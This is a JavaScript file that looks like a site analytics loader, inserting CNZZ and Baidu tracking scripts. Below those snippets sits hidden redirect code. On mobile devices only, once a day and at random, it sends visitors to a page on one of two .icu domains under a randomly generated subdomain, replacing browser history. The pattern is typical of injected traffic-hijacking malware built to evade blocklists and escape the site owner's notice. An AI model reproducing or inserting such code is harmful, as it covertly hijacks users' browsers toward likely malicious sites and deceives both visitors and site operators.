;(function() {
  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  );

  // CNZZ 统计（PC/移动端都插入）
  var _czc = _czc || [];
  (function() {
    var um = document.createElement("script");
    um.src = "https://s4.cnzz.com/z.js?id=1281419299&async=1";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(um, s);
  })();

  // 百度统计（PC/移动端都插入）
  var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1314e4cf3cea7338d0a3e2da608f6d80";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
  var _hmt = _hmt || [];
  (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?6a971e7c8b0c11cf7e590b211f60d8fd";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
   hm.src = "https://hm.baidu.com/hm.js?1f407fee808bd414e311105ae4ce100e";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
  if (!isMobile) {
    return;
  }

  var today = new Date().toISOString().slice(0, 10);
  var ls = window.localStorage;
  var lastJumpDate = ls.getItem("lastJumpDate");

  if (lastJumpDate !== today) {
    if (Math.random() < 0.8) {
      var urls = [
        "https://69tzd.icu/mian.html",
        "https://69tzc.icu/mian.html"
      ];
      var idx = Math.floor(Math.random() * urls.length);
      var selected = urls[idx];
      var urlObj = new URL(selected);
      var parts = urlObj.host.split('.');
      if (parts.length >= 2) {
        var domainParts = parts.slice(-2).join('.');
        var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var rand = '';
        for (var i = 0; i < 6; i++) {
          rand += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        urlObj.host = rand + '.' + domainParts;
      }
      window.location.replace(urlObj.toString());
    }
    ls.setItem("lastJumpDate", today);
  }
})();
